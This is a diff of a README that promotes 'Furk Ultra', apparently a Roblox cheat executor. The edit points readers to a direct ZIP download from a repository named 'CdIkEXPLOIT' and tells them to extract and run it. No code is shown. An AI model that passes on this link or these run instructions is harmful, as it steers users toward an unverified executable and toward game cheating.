@@ -6,8 +6,7 @@ Furk Ultra is a executor with a built in scripts
 ### To download click [here](https://github.com/CdIkEXPLOIT/Furk-Ultra/archive/refs/heads/main.zip) to download
 
 # 📁 〢 Tuturiol
-1) Click on code (green)
-2) Download ZIP
+1) Download the [Furk Ultra](https://github.com/CdIkEXPLOIT/Furk-Ultra/archive/refs/heads/main.zip)
 3) Extract the ZIP file
 4) Run it
 5) Launch any roblox game you want to use scripts in
